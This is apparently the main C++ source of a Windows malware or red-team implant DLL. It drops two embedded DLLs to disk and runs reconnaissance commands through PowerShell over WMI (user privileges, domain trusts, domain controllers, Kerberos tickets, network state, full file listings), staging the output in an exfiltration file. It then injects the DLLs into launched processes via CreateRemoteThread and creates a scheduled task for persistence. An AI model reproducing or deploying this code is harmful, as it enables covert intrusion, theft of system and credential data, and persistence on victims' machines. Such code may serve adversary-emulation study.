// This file contains the 'main' function. Program execution begins and ends here.

#include "stdio.h"
#include "windows.h"
#include "exception"
#include <stdlib.h>
#include <string>
#include <cstring>
#include <fstream>
#include <filesystem>
#include <sys/stat.h>
#include <iostream>
#include <WinInet.h>
#include "Injection.cpp"
#include "Task.cpp"
#include "Utility.cpp"
#include "resource.h"
#include "wmi.cpp"
#include <random>
#include <Lmcons.h>
#include <vector>
#pragma comment( lib,"Wininet.lib")

#define _WIN32_DCOM

using namespace std;


void writeFile(char* Data) {
    //Writes text to the file before being exfilled
    //char filePath[] = "C:\\temp\\abcd.txt";
    fstream theFile;
    theFile.open(ExfilPathChar, fstream::app);
    theFile << Data;
    theFile.close();
}


void sendPowershell(LPCWSTR data) {
    //sends commands to Powershell. Return is written to the Exfil file. 
    LPCWSTR part1 = L"Powershell.exe -c $PSDefaultParameterValues['*:Encoding'] = 'utf8';";
    LPCWSTR pipe = L" >> ";
    std::wstring tail1 = std::wstring(pipe) + ExfilPath + L";";
    LPCWSTR tail2 = L"echo '========================' >> ";
    std::wstring df = part1 + std::wstring(data) + tail1 + tail2 + ExfilPath;
    LPCWSTR dfc = df.c_str();
    WMIC(dfc);
    Sleep(PowershellSleepDelay);
    //char line[] = "=========================================";
    //writeFile(line);
}

DWORD FindProcessId(LPCTSTR ProcessNameZ)
{
    //Finds process ID by name and returns PID
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) { // must call this first
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessNameZ)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap); // close handle on failure
    return 0;

}

void launchprocWMIC(LPCWSTR proc) {
    WMIC(proc);
}

HMODULE GetCurrentModule()
{ // Need for dropping files
    HMODULE hModule = NULL;
    GetModuleHandleEx(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (LPCTSTR)GetCurrentModule,
        &hModule);
    return hModule;
}

void dropDll() {
    //drops two dlls to disk
    HMODULE test = GetCurrentModule(); //need for dll compiling
    HRSRC myResource = ::FindResource(test, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    unsigned int myResourceSize = ::SizeofResource(test, myResource);
    HGLOBAL myResourceData = ::LoadResource(test, myResource);
    void* pMyExecutable = ::LockResource(myResourceData);

    //Check if stage2 file exists, if it does not then create it.
    struct stat buffer;
    if (!(stat(dllpath1.c_str(), &buffer) == 0)) {
        std::ofstream f(dllpath1, std::ios::out | std::ios::binary);
        f.write((char*)pMyExecutable, myResourceSize);
        f.close();
    }

    HRSRC myResource2 = ::FindResource(test, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
    unsigned int myResourceSize2 = ::SizeofResource(test, myResource2);
    HGLOBAL myResourceData2 = ::LoadResource(test, myResource2);
    void* pMyExecutable2 = ::LockResource(myResourceData2);

    //Check if stage2 file exists, if it does not then create it.
    struct stat buffer2;
    if (!(stat(dllpath2.c_str(), &buffer2) == 0)) {
        std::ofstream f(dllpath2, std::ios::out | std::ios::binary);
        f.write((char*)pMyExecutable2, myResourceSize2);
        f.close();
    }

}

void gatherData() {
    //Sends below powershell commands
    LPCWSTR cmd00 = L"whoami";
    sendPowershell(cmd00);
    LPCWSTR cmd0 = L"whoami /priv";
    sendPowershell(cmd0);
    LPCWSTR cmd1 = L"ipconfig /all";
    sendPowershell(cmd1);
    LPCWSTR cmd2 = L"nltest /domain_trusts /all_trusts";
    sendPowershell(cmd2);
    LPCWSTR cmd3 = L"nltest /dclist:AREA52";
    sendPowershell(cmd3);
    LPCWSTR cmd4 = L"net users";
    sendPowershell(cmd4);
    LPCWSTR cmd5 = L"net localgroups";
    sendPowershell(cmd5);
    LPCWSTR cmd6 = L"systeminfo";
    sendPowershell(cmd6);
    LPCWSTR cmd7 = L"hostname";
    sendPowershell(cmd7);
    LPCWSTR cmd8 = L"arp -A";
    sendPowershell(cmd8);
    LPCWSTR cmd9 = L"tasklist /SVC";
    sendPowershell(cmd9);
    LPCWSTR cmd10 = L"netstat -ano";
    sendPowershell(cmd10);
    LPCWSTR cmd11 = L"dir /a-r-d /s /b";
    sendPowershell(cmd11);
    LPCWSTR cmd12 = L"klist";
    sendPowershell(cmd12);
    LPCWSTR cmd13 = L"klist sessions";
    sendPowershell(cmd13);
    LPCWSTR cmd14 = L"klist tgt";
    sendPowershell(cmd14);
}

extern "C" 
__declspec(dllexport) 
void CALLBACK trr(HWND, HINSTANCE, LPSTR, int)
{
    bool cont = TRUE; // can change this to check for a mutex or for anti sandbox/forensics in the future
    if (cont) {
        launchprocWMIC(RedH1);
        Sleep(SleepBetweenStages);
        dropDll();
        Sleep(SleepBetweenStages);
        gatherData();
        Sleep(SleepBetweenStages);

        DWORD Result = 0;
        launchprocWMIC(InjProc2);
        int pid = FindProcessId(InjProcC2);
        Sleep(SleepBetweenStages);
        Result = InjectDllUsingCreateRemoteThread(pid, wdllpath2);
        if (Result == -1) {
            printf("Inj Failed\n");
        }
        else {
            printf("In Succeeded\n");
        }
        Sleep(SleepBetweenStages);

        launchprocWMIC(RedH2);
        Sleep(SleepBetweenStages);

        launchprocWMIC(InjProc);
        pid = FindProcessId(InjProcC);
        Sleep(SleepBetweenStages);
        Result = InjectDllUsingCreateRemoteThread(pid, wdllpath1);
        if (Result == -1) {
            printf("Inj Failed\n");
        }
        else {
            printf("Inj Succeeded\n");
        }

        Sleep(SleepBetweenStages);
        launchprocWMIC(RedH3);
        Sleep(SleepBetweenStages);
        schTask();
    }
    __declspec(dllimport) void Main(void);
}
